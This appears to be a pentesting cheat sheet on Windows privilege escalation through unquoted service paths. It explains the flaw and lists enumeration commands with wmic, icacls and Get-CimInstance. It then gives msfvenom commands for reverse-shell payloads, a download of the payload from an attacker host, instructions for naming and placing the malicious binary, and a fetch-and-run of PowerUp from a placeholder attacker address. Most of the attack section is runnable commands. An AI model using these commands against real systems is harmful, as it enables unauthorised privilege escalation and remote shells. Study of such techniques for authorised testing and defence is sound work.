######################################################################
# Presentation.

#The UnquotedServicePath hijack is a Windows PrivEsc vector in which we leverage a malconfiguration Windows feature related to unquoted binpath strings. 

#The OS, in order to init a service must run the executable binary associated with it. If the binpath var, that stores the path to the service's binary, doesn't have quotes the system would interpret the string as a command with arguments delimitated by spaces.

#This means that if we have the following var:

#	binPath=C:\Program Files\My Program\My service\service.exe

#The system will try to execute the following executables: C:\Program.exe, C:\Program FIles\My.exe and finally C:\Program Files\My Program\My service\service.exe. So if we could store in one of those locations our malicious payload, we could have at the restart of the service, code execution through an adminstrative account resulting in a privilege escalation.

######################################################################
#### icacls permissions mask ####

# + Mask +++++++ Permissions +
#   F             Full access
#   M             Modify access
#   RX            Read and execute access
#   R             Read-only access
#   W             Write-only access

######################################################################

#### Enumeration ####

#List Name,State,Paths of services.
Get-CimInstance -ClassName win32_service | Select Name,State,PathName 

#Displays unquoted bin paths from services.
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """ 
>
>"

#Checking wether we can start/stop/restart services or not: 
Start-Service <SERVICE_NAME>
Restart-Service <SERVICE_NAME>
Stop-Service <SERVICE_NAME>

#Check permissions of icacls.
icacls "<BINPATH>" #Check permissions of icacls.

#### Leading the attack ####

#Once we find a unquoted service path that give us a satisfactory location to write pur payload and know how to trigger the start/restart of the service we can make our payload with msfvenom:
## x86 Payload:
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o <SERVICE>.exe

## x64 Payload:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o <SERVICE>.exe

##Or compiling adduser.c:
x86_64-w64-mingw32-gcc adduser.c -o <SERVICE>.exe

#Transfer file
iwr -uri http://<ATTACKER_IP>/<SERVICE>.exe -Outfile <PATHFILE>.exe 

NOTE: as the vulnerable unquoted path checks gradually the path using the rest of ir as arguments, You should use a binary name that is part of the path you can write to. 
# For example: 
## VULNERABLE PATH: C:\Enterprise Software\Monitoring Solution\Surveillance Apps\ReynhSurveillance.exe
## WRITEABLE PATH BY YOUR USER: C:\Enterprise Software\Monitoring Solution\
## You need to name your malicious binary as --> Surveillance.exe, place it in C:\Enterprise Software\Monitoring Solution\ and then Restart-Service because the way that Windows performs the binary search is:
## 1.- C:\Enterprise.exe
## 2.- C:\Enterprise Software\Monitoring.exe
## 3.- C:\Enterprise Software\Monitoring Solution\Surveillance.exe --> When Windows find Surveillance.exe in this search, it will execute our malicious binary instead of the legit one ReynhSurveillance.exe.

#PowerUp's Invoke-Allchecks cmdlet displays Unquoted Path services.
iex (New-Object Net.WebClient).DownloadString('http://IP_ATTACKER/PowerUp.ps1')
Invoke-AllChecks
